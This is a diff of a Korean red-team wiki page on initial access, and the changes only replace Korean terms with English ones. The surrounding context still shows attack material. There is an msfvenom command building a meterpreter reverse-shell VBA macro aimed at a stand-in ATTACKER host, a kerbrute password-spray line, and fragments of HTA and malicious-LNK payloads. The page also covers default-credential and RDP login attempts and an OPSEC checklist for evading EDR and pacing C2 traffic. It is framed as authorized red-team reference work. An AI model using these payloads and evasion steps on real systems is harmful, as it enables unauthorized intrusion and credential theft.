@@ -1,6 +1,6 @@
 # 초기 침투
 
-내부 네트워크 또는 타겟 시스템에 대한 초기 침투 단계.
+내부 네트워크 또는 target 시스템에 대한 초기 침투 단계.
 
 피싱, 취약한 외부 서비스, credential 공격 등을 통해 최초 접근 권한을 확보한다.
 
@@ -38,9 +38,9 @@ kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt 'Password123!'
 레드팀 작전에서 초기 침투 시 가장 많이 사용되는 기법 중 하나.
 
 !!! tip "전용 문서"
-    피싱 인프라 구축, GoPhish/Evilginx2 (AiTM MFA 우회), Consent Phishing, MFA Fatigue, Vishing, HTML Smuggling 등 **상세 시나리오와 OPSEC** 은 [Phishing / Vishing 전용 문서](phishing.md) 를 참고. 이 섹션은 페이로드 포맷에 국한된 요약.
+    피싱 인프라 구축, GoPhish/Evilginx2 (AiTM MFA 우회), Consent Phishing, MFA Fatigue, Vishing, HTML Smuggling 등 **상세 시나리오와 OPSEC** 은 [Phishing / Vishing 전용 문서](phishing.md) 를 참고. 이 섹션은 payload 포맷에 국한된 요약.
 
-### 페이로드 유형
+### payload 유형
 
 | 유형 | 설명 | 비고 |
 |------|------|------|
@@ -50,7 +50,7 @@ kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt 'Password123!'
 | LNK | 바로가기 | 아이콘 위장, powershell 실행 |
 | OneNote | .one 파일 | 2023년 이후 제한됨 |
 
-### Office Macro 페이로드
+### Office Macro payload
 
 ```vba
 ' VBA 매크로 예시 (Auto_Open 또는 Document_Open)
@@ -67,7 +67,7 @@ End Sub
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vba-psh -o macro.vba
 ```
 
-### HTA 페이로드
+### HTA payload
 
 ```html
 <html>
@@ -100,7 +100,7 @@ a.click();
 </html>
 ```
 
-### LNK 페이로드
+### LNK payload
 
 ```powershell
 # PowerShell로 악성 LNK 생성
@@ -133,7 +133,7 @@ whatweb http://<target>
 searchsploit <서비스명> <버전>
 ```
 
-자주 타겟이 되는 서비스:
+자주 target이 되는 서비스:
 
 - VPN (Fortinet, Pulse Secure, Citrix)
 - Exchange Server (ProxyShell, ProxyLogon)
@@ -194,7 +194,7 @@ rpcclient -N -U '' <ip>
 
 ---
 
-## 기본 자격 증명 (Default Credentials)
+## 기본 credential (Default Credentials)
 
 ```bash
 # 웹 서비스 기본 계정 시도
@@ -220,7 +220,7 @@ nxc rdp <ip> -u administrator -p 'Password1!'
 
 ## Credential Stuffing
 
-유출된 자격 증명 목록을 대상 서비스에 자동으로 시도하는 기법.
+유출된 credential 목록을 대상 서비스에 자동으로 시도하는 기법.
 
 ```bash
 # 유출 DB 확인 사이트
@@ -249,9 +249,9 @@ ffuf -u <url>/login -X POST \
 
 ### 구성 요건
 
-- 타겟 기관 CISO가 **엔드포인트 1대**를 레드팀에 제공 (물리/가상 모두 가능)
+- target 기관 CISO가 **endpoint 1대**를 레드팀에 제공 (물리/가상 모두 가능)
 - 제공 형태는 보통 다음 중 하나:
-    1. VDI/Citrix 세션 크리덴셜
+    1. VDI/Citrix session 크리덴셜
     2. 실제 도메인 가입 Windows 노트북 + 일반 직원 권한 계정
     3. VPN 계정 + 내부 네트워크 접근권
 - EDR/AV/프록시/Proxy Auth/Conditional Access 등 **실제 직원과 동일한 보안 통제** 적용
@@ -269,9 +269,9 @@ ffuf -u <url>/login -X POST \
 
 ### 레드팀 OPSEC 체크리스트 (Assumed Breach)
 
-- [ ] 제공받은 엔드포인트에서 **첫 Beacon 전까지** 로컬 정찰 최소화 (Defender/EDR 초기 관찰 윈도우 회피)
+- [ ] 제공받은 endpoint에서 **첫 Beacon 전까지** 로컬 정찰 최소화 (Defender/EDR 초기 관찰 윈도우 회피)
 - [ ] C2 통신은 Jitter + Sleep 60~180s 이상, 업무시간 내 전송
-- [ ] LDAP 정찰은 `-LoopDetection` / `ServicePrincipalName` 등 **빈도 낮은 속성** 중심, 단일 세션에서 전체 도메인 덤프 지양
+- [ ] LDAP 정찰은 `-LoopDetection` / `ServicePrincipalName` 등 **빈도 낮은 속성** 중심, 단일 session에서 전체 도메인 덤프 지양
 - [ ] 티켓/해시 획득 후 24h 내 Tier 0 진입 시도는 대부분 탐지됨 → 며칠 간 정찰만 수행 후 이동
 - [ ] 최종 미션 수행 직전, 블루팀에게 사전 고지(High-Impact Only Card)
 
